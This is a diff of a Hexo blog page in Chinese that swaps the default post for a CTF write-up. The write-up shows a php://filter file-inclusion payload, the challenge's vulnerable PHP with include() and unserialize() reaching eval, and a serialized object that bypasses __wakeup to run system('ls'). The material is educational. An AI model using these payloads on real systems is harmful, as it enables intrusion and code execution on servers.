@@ -4,8 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, 舞动的獾">
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
+    <meta name="keywords" content="ctf圣诞萌新赛, 舞动的獾">
+    <meta name="description" content="webweb1
+存在文件包含漏洞，直接读取源码
+payload:
+?file=php://filter/read=convert.base64-encode/resource=index.php
+得到源码
+index.php
+&amp;lt;?ph">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +19,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Hello World | 舞动的獾</title>
+    <title>ctf圣诞萌新赛 | 舞动的獾</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -259,13 +265,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Hello World
+                        ctf圣诞萌新赛
                     </div>
                 </div>
             </div>
@@ -374,9 +380,17 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/萌新赛/" target="_blank">
+                                <span class="chip bg-color">萌新赛</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -387,21 +401,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2018-09-19
+                    2019-12-25
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        73
+                        1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        4 分
                     </div>
                     
                 
@@ -417,19 +431,92 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
+                <h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><img src="/2019/12/25/ctf-sheng-dan-meng-xin-sai/1.PNG">
+<p>存在文件包含漏洞，直接读取源码</p>
+<p>payload:</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>得到源码</p>
+<p>index.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'&lt;a href="./index.php?file=show.php">&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"NANI?"</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
+
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server
+<p>user.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">convent</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$warn</span> <span class="token operator">=</span> <span class="token string">"No hacker."</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">warn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate
+<p><strong>写在前面</strong></p>
+<p>序列化：</p>
+<p>在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。如果一个脚本中想要的调用之前一个脚本的变量，但是之前一个脚本已经执行完毕，所有的变量和内容释放掉了，那该如何操作呢？serialize和unserialize就是解决这一问题的存在，serialize可以将变量转换为字符串，并且在转换的过程中可以保存当前变量的值，而unserialize则可以将serialize生成的字符串转换回变量。通俗来说：通过反序列化在特定条件下可以重建php对象并执行php对象中某些magic函数。</p>
+<p>魔术函数</p>
+<p>1.__construct() </p>
+<p><em>实例化对象时被调用， 当__construct和以类名为函数名的函数同时存在时，__construct将被调用，另一个不被调用。</em></p>
+<p>2.__destruct()<br>当删除一个对象或对象操作终止时被调用。</p>
+<p>3.__call()<br>对象调用某个方法，<br>若方法存在，则直接调用；<br>若不存在，则会去调用__call函数。</p>
+<p>4.__get()<br>读取一个对象的属性时，<br>若属性存在，则直接返回属性值；<br>若不存在，则会调用__get函数。</p>
+<p>5.__set()<br>设置一个对象的属性时，<br>若属性存在，则直接赋值；<br>若不存在，则会调用__set函数。</p>
+<p>6.__toString()<br>打印一个对象的时被调用。如echo $obj;或print $obj;</p>
+<p>7.__clone()<br>克隆对象时被调用。如：$t=new Test();$t1=clone $t;</p>
+<p>8.__sleep()<br>serialize之前被调用。若对象比较大，想删减一点东东再序列化，可考虑一下此函数。</p>
+<p>9.__wakeup()<br>unserialize时被调用，做些对象的初始化工作。</p>
+<p>10.__isset()<br>检测一个对象的属性是否存在时被调用。如：isset($c-&gt;name)。</p>
+<p>11.__unset()<br>unset一个对象的属性时被调用。如：unset($c-&gt;name)。</p>
+<p>12.__set_state()<br>调用var_export时，被调用。用__set_state的返回值做为var_export的返回值。</p>
+<p>13.__autoload()<br>实例化一个对象时，如果对应的类不存在，则该方法被调用。</p>
+<p>魔术常量</p>
+<p>1.__LINE__<br>返回文件中的当前行号。</p>
+<p>2.__FILE__<br>返回文件的完整路径和文件名。如果用在包含文件中，则返回包含文件名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径，而在此之前的版本有时会包含一个相对路径。</p>
+<p>3.__FUNCTION__<br>返回函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。</p>
+<p>4.__CLASS__<br>返回类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。</p>
+<p>5.__METHOD__<br>返回类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</p>
+<p><strong>回到本题</strong></p>
+<p>serialize时调用了__sleep，unserialize时调用了__wakeup，在对象被销毁的时候用了__destruct。</p>
+<p>在user.php中发现了反序列化和<strong>wakeup函数，和反序列化函数，_\</strong>wakeup函数会使赋值的变量</p>
+<p>为null,绕过__wakeup函数实现命令执行。</p>
+<p>当序列化的结果的属性发生改变时，反序列化的时会跳过wakeup函数。</p>
+<p>对convert类进行序列化，查看目录下所有的文件</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">convent</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> <span class="token variable">$warn</span> <span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token variable">$pay</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">convent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pay</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>得到：</p>
+<p><code>O:7:&quot;convent&quot;:1:{s:4:&quot;warn&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;}</code></p>
+<p>改为：</p>
+<p><code>O:7:&quot;convent&quot;:2:{s:4:&quot;warn&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;}</code></p>
+<img src="/2019/12/25/ctf-sheng-dan-meng-xin-sai/2.png">
+<p>查看dsuhhjfdgjhaskjdkj.txt，得到flag</p>
 
             </div>
             <hr/>
@@ -577,7 +664,7 @@
                     </span>
                     <a href="https://yubin0617.github.io" class="b-link-green">舞动的獾</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2018/09/19/hello-world/" class="b-link-green">Hello World</a>
+                    <a href="/2019/12/25/ctf-sheng-dan-meng-xin-sai/" class="b-link-green">ctf圣诞萌新赛</a>
                 </p>
             </div>
         </div>
@@ -598,57 +685,31 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2018/09/20/ni-hao-hexo/">
+                <a href="/2019/12/25/ctf-sheng-dan-meng-xin-sai/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="你好!hexo">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctf圣诞萌新赛">
                         
-                        <span class="card-title">你好!hexo</span>
+                        <span class="card-title">ctf圣诞萌新赛</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary"></div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-09-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-user fa-fw"></i>
-                            舞动之獾
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
-            </div>
-            <div class="card">
-                <a href="/2018/09/19/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex</div>
+                    <div class="summary">webweb1
+存在文件包含漏洞，直接读取源码
+payload:
+?file=php://filter/read=convert.base64-encode/resource=index.php
+得到源码
+index.php
+&lt;?ph</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-09-19
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-25
                             </span>
                         <span class="publish-author">
                             
@@ -659,6 +720,69 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/萌新赛/" target="_blank">
+                        <span class="chip bg-color">萌新赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/11/14/qiang-wang-bei-gao-ming-de-hei-ke/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="强网杯高明的黑客">
+                        
+                        <span class="card-title">强网杯高明的黑客</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">下载源码，写脚本遍历出可以利用的shell，cat flag
+脚本：
+import os
+import requests
+from multiprocessing import Pool
+
+path = "C:/Users/26624/De</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            舞动之獾
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/高明的黑客/" target="_blank">
+                        <span class="chip bg-color">高明的黑客</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
